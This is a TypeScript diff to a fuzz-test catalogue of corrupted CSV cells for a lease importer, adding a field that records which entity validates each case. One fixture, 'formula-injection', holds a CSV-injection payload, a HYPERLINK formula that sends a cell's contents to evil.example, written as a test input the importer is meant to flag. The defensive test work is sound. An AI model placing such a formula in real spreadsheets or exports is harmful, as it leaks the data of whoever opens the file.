@@ -35,6 +35,17 @@ export type CorruptionLayer = "value" | "structural"
 export interface Corruption {
   id: string
   layer: CorruptionLayer
+  /**
+   * WHICH ENTITY validates this. The pure fuzz tier projects the LEASE row only, so it can only hold the lease
+   * to account: an ID checksum is checked in `checkTenantIdentity`, a province in `upsertProperty`, a formula in
+   * runImport's own scan — none of which the lease projection can see.
+   *
+   * Without this, the fuzzer accused the importer of silently accepting a bad SA ID 5 912 times, when in truth
+   * the fuzzer was asking the wrong function. A probe that measures its own reach rather than the code's
+   * correctness — the fourth time that shape has appeared in this arc, which is exactly why it is now labelled
+   * in the data instead of remembered by whoever is reading.
+   */
+  scope: "lease" | "tenant" | "property"
   /** What the importer must do about it. The harness asserts the report is HONEST, not that it agrees with us. */
   expect: "rejected" | "flagged" | "imported"
   why: string
@@ -49,22 +60,22 @@ const set = (cells: Record<string, string>, headers: string[], match: RegExp, va
 /** VALUE-level corruptions — one wrong cell. These test the validators. */
 export const VALUE_CORRUPTIONS: Corruption[] = [
   {
-    id: "rent-negative", layer: "value", expect: "rejected",
+    id: "rent-negative", scope: "lease", layer: "value", expect: "rejected",
     why: "a lease that bills a negative amount is not a lease",
     apply: (c, h) => set(c, h, /rent|huur/i, "-6600.50"),
   },
   {
-    id: "rent-not-a-number", layer: "value", expect: "rejected",
+    id: "rent-not-a-number", scope: "lease", layer: "value", expect: "rejected",
     why: "no rent at all — the money term the whole lease hangs on",
     apply: (c, h) => set(c, h, /rent|huur/i, "TBC"),
   },
   {
-    id: "dates-swapped", layer: "value", expect: "rejected",
+    id: "dates-swapped", scope: "lease", layer: "value", expect: "rejected",
     why: "the lease ends before it starts, so every date computed from it is nonsense",
     apply: (c, h) => set(c, h, /lease end|huur eindig|end date|termination/i, "01/01/2019"),
   },
   {
-    id: "escalation-absurd", layer: "value", expect: "flagged",
+    id: "escalation-absurd", scope: "lease", layer: "value", expect: "flagged",
     why: "500% a year is type-valid and absurd — a misplaced decimal, almost certainly",
     // Set the BASIS too, not just the rate. Some generated rows say "None" (no escalation), and dropping a rate
     // onto one of those makes the row CONTRADICTORY — "no increase" AND "500% a year" — which the importer
@@ -77,17 +88,17 @@ export const VALUE_CORRUPTIONS: Corruption[] = [
     },
   },
   {
-    id: "id-checksum-fail", layer: "value", expect: "flagged",
+    id: "id-checksum-fail", scope: "tenant", layer: "value", expect: "flagged",
     why: "a mistyped ID digit must not cost the agency the tenant — import it, mark it known-wrong",
     apply: (c, h) => set(c, h, /id number|id nommer|identity|id\/passport/i, "1234567890123"),
   },
   {
-    id: "email-malformed", layer: "value", expect: "flagged",
+    id: "email-malformed", scope: "tenant", layer: "value", expect: "flagged",
     why: "the dedup key AND the comms address — a bad one merges two people or reaches nobody",
     apply: (c, h) => set(c, h, /(^e-?mail)|(email address)|(tenant email)/i, "not-an-email"),
   },
   {
-    id: "province-abolished", layer: "value", expect: "rejected",
+    id: "province-abolished", scope: "property", layer: "value", expect: "rejected",
     why: "Transvaal has not existed since 1994; the column is CHECK-constrained",
     apply: (c, h) => set(c, h, /province|provinsie/i, "Transvaal"),
   },
@@ -99,23 +110,23 @@ export const VALUE_CORRUPTIONS: Corruption[] = [
  */
 export const STRUCTURAL_CORRUPTIONS: Corruption[] = [
   {
-    id: "accounting-negative", layer: "structural", expect: "rejected",
+    id: "accounting-negative", scope: "lease", layer: "structural", expect: "rejected",
     why: "Excel writes a negative as (1 234,00). Read as a positive, the agency's credit becomes a debit.",
     apply: (c, h) => set(c, h, /rent|huur/i, "(6 600,50)"),
   },
   {
-    id: "scientific-notation", layer: "structural", expect: "rejected",
+    id: "scientific-notation", scope: "lease", layer: "structural", expect: "rejected",
     why: "Excel silently turns a wide number into 6.6005E+03. Parsed naively that is R6.60.",
     apply: (c, h) => set(c, h, /rent|huur/i, "6.6005E+03"),
   },
   {
-    id: "formula-injection", layer: "structural", expect: "flagged",
+    id: "formula-injection", scope: "tenant", layer: "structural", expect: "flagged",
     why: "a cell beginning = is EXECUTED by Excel when the next person opens an export of this data — " +
          "importing it verbatim makes us the delivery mechanism for a CSV-injection attack on our own customer",
     apply: (c, h) => set(c, h, /first name|naam|tenant first/i, '=HYPERLINK("http://evil.example/?x="&A1,"click")'),
   },
   {
-    id: "whitespace-only", layer: "structural", expect: "rejected",
+    id: "whitespace-only", scope: "lease", layer: "structural", expect: "rejected",
     why: "a cell of spaces is not a value, but it is not empty either — the classic trim() gap",
     apply: (c, h) => set(c, h, /rent|huur/i, "   "),
   },
